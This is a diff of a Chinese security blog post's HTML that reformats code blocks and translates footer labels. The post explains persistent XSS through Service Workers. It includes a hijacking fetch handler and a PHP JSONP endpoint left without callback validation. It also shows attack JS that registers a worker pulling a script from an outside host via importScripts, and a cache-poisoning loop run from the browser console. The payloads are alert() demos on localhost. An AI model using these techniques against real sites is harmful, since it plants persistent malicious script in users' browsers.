@@ -116,25 +116,61 @@
 <p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
 <h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
 <h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/serviceworker.js&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">normal visit</span><br></pre></td></tr></table></figure>
-
-<p>script标签下的type必须指明为<code>text/javascript</code></p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/serviceworker.js&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+normal visit</code></pre><p>script标签下的type必须指明为<code>text/javascript</code></p>
 <h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
 <h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">    var url = event.request.clone(); </span><br><span class="line">    body = &apos;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">    init = &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;;</span><br><span class="line">    if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;</span><br><span class="line">        res  = new Response(body,init);</span><br><span class="line">        event.respondWith(res.clone());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+    var url = event.request.clone(); 
+    body = &#39;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;&#39;;
+    init = {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }};
+    if(url.url==&#39;http://localhost/reurl.html&#39;){
+        res  = new Response(body,init);
+        event.respondWith(res.clone());
+    }
+});</code></pre><h3 id="jsonp回调接口"><a href="#jsonp回调接口" class="headerlink" title="jsonp回调接口"></a>jsonp回调接口</h3><p>利用储值型X点写入下面的代码</p>
 <p>当JSONP接口存在缺陷时，比如没有校验回调名。导致返回内容可控<br>比如：url?callback=importScript(…)<br>返回<code>importScript(...)</code><br>代码实现如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// JSONP 回调名缺少校验</span><br><span class="line">$cb_name = $_GET[&apos;callback&apos;];</span><br><span class="line">$cb_data = time();</span><br><span class="line"></span><br><span class="line">header(&apos;Content-Type: application/javascript&apos;);</span><br><span class="line">echo(&quot;$cb_name($cb_data)&quot;);</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php
+// JSONP 回调名缺少校验
+$cb_name = $_GET[&#39;callback&#39;];
+$cb_data = time();
 
-<p>attack_js</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
+header(&#39;Content-Type: application/javascript&#39;);
+echo(&quot;$cb_name($cb_data)&quot;);</code></pre><p>attack_js</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;</code></pre><p>这里面callback回调的事件就相当于sw脚本。当js被执行之后会注册一个sw脚本,内容是回调的事件<br><img src="https://i.loli.net/2018/11/05/5be04f7b70f25.png" alt><br><img src="https://i.loli.net/2018/11/05/5be04f9d988ca.png" alt></p>
 <p>或者鸡肋上传一个html到网站下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/getdata?callback=importScripts(&apos;//third.com/sw.js?g&apos;)&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">it&apos;s nothing</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
+<pre><code>&lt;html&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot; /&gt; 
+&lt;body&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    var url=&quot;//localhost/getdata?callback=importScripts(&#39;//third.com/sw.js?g&#39;)&quot;;
+    if (&#39;serviceWorker&#39; in navigator) {
+ navigator.serviceWorker.register(url)
+ .then(function(registration) {
+ console.log(&#39;ServiceWorker registration successful with scope: &#39;, registration.scope);
+ })
+};
+&lt;/script&gt;
+it&#39;s nothing
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><ul>
 <li>存在有缺陷的 JSONP 接口</li>
 <li>JSONP 的目录尽可能浅（最好在根目录下），如果放在域的根目录下，将会收到这个域下的所有fetch事件</li>
 <li>JSONP 返回的 Content-Type 必须是 JS 类型</li>
@@ -144,13 +180,54 @@
 <h2 id="Cache缓存污染"><a href="#Cache缓存污染" class="headerlink" title="Cache缓存污染"></a>Cache缓存污染</h2><p>前文的攻击不涉及cache里的资源,进行的是协商缓存，下面说一下强缓存的利用。</p>
 <h2 id="请求资源"><a href="#请求资源" class="headerlink" title="请求资源"></a>请求资源</h2><p>如果使用cache.put方法，则请求的资源成功后会存在Cache Storage里。如果fetch里写了caches.match(event.request)方法，则每次请求时会先从caches找缓存来优先返回给请求页面。若没有缓存，再进行新的缓存操作。</p>
 <p>下面是一个缓存读取/判断的demo</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))</span><br><span class="line">self.addEventListener(&apos;fetch&apos;, function (event) &#123;  </span><br><span class="line">        event.respondWith(</span><br><span class="line">            //console.log(event.request)</span><br><span class="line">        caches.match(event.request).then(function(res)&#123;</span><br><span class="line">        if(res)&#123;//如果有缓存则使用缓存</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        return requestBackend(event);//没缓存就进行缓存</span><br><span class="line">        &#125;)</span><br><span class="line">        )</span><br><span class="line">   &#125;);</span><br><span class="line">   </span><br><span class="line">function requestBackend(event)&#123;  </span><br><span class="line">        var url = event.request.clone();  </span><br><span class="line">        console.log(url)  //打印内容是打印到请求页面</span><br><span class="line">        if(url.url==&apos;http://localhost/reurl.html&apos;)&#123;//判断是否为需要劫持的资源</span><br><span class="line">    </span><br><span class="line">        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, &#123;headers: &#123; &apos;Content-Type&apos;: &apos;text/html&apos; &#125;&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">        return fetch(url).then(function(res)&#123;</span><br><span class="line">        //检测是否为有效响应</span><br><span class="line">        if(!res || res.status !== 200 || res.type !== &apos;basic&apos;)&#123;</span><br><span class="line">        return res;</span><br><span class="line">        &#125;</span><br><span class="line">        var response = res.clone();</span><br><span class="line">        caches.open(&apos;v1&apos;).then(function(cache)&#123;  //打开v1缓存进行存储</span><br><span class="line">        cache.put(event.request, response);</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">        return res;</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>// 拦截特定的Url，如果请求是对应的Url，则返回攻击的response。否则用Fetch请求网络上原本的url，进行本地缓存(为了不影响正常功能))
+self.addEventListener(&#39;fetch&#39;, function (event) {  
+        event.respondWith(
+            //console.log(event.request)
+        caches.match(event.request).then(function(res){
+        if(res){//如果有缓存则使用缓存
+        return res;
+        }
+        return requestBackend(event);//没缓存就进行缓存
+        })
+        )
+   });
 
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
+function requestBackend(event){  
+        var url = event.request.clone();  
+        console.log(url)  //打印内容是打印到请求页面
+        if(url.url==&#39;http://localhost/reurl.html&#39;){//判断是否为需要劫持的资源
+
+        return new Response(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;, {headers: { &#39;Content-Type&#39;: &#39;text/html&#39; }})
+        }
+        return fetch(url).then(function(res){
+        //检测是否为有效响应
+        if(!res || res.status !== 200 || res.type !== &#39;basic&#39;){
+        return res;
+        }
+        var response = res.clone();
+        caches.open(&#39;v1&#39;).then(function(cache){  //打开v1缓存进行存储
+        cache.put(event.request, response);
+        });
+
+        return res;
+        })
+}</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前几天看ED师傅的研究,发现这种好玩但是鸡肋的方法。上面提到cache.put的方法把js资源添加到Cache Storage，其实如果我们用cache.put把恶意代码插入,覆盖原始的js数据。后果就是当sw请求cahce里的资源时会执行恶意代码。比如workbox会先从缓存读取静态资源,我们用异步请求将恶意代码无限覆盖这个缓存时：</p>
 <p>控制台输入下面的恶意代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">async function replay() &#123;</span><br><span class="line">    const name = &apos;xx&apos;</span><br><span class="line">    const url = &apos;xx&apos;</span><br><span class="line">    const payload = `</span><br><span class="line">alert(1);</span><br><span class="line">`</span><br><span class="line">    let cache = await caches.open(name);</span><br><span class="line">    let req = new Request(url);</span><br><span class="line">    let res = new Response(payload + replay + &apos;;replay()&apos;);   //执行alert+写入cache内容+执行fn</span><br><span class="line">    setInterval(_ =&gt; &#123;</span><br><span class="line">      cache.put(req, res.clone());</span><br><span class="line">    &#125;, 500);</span><br><span class="line">&#125;</span><br><span class="line">replay();</span><br></pre></td></tr></table></figure>
-
-<p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
+<pre><code>async function replay() {
+    const name = &#39;xx&#39;
+    const url = &#39;xx&#39;
+    const payload = `
+alert(1);
+`
+    let cache = await caches.open(name);
+    let req = new Request(url);
+    let res = new Response(payload + replay + &#39;;replay()&#39;);   //执行alert+写入cache内容+执行fn
+    setInterval(_ =&gt; {
+      cache.put(req, res.clone());
+    }, 500);
+}
+replay();</code></pre><p>就可以在cache Storage里看到500ms刷新并覆盖一次的js资源。<br><img src="https://i.loli.net/2018/11/05/5be0502e0dd09.png" alt></p>
 <h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Service Worker API(<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API</a>)</p>
 <p>浏览器缓存知识(<a href="https://www.cnblogs.com/lyzg/p/5125934.html" target="_blank" rel="noopener">https://www.cnblogs.com/lyzg/p/5125934.html</a>)</p>
 
@@ -159,16 +236,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2018/11/14/RootkitXSS֮ServiceWorker/">https://hpdoger.cn/2018/11/14/RootkitXSS֮ServiceWorker/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -181,7 +258,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
